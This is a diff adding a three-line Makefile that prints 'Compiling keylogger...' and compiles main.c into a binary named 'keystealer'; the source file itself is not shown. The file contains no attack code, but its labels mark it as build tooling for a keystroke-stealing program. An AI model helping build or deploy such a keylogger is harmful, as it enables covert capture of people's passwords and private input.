@@ -1,0 +1,3 @@
+all:
+	@echo [+] Compiling keylogger...
+	@gcc main.c -o keystealer
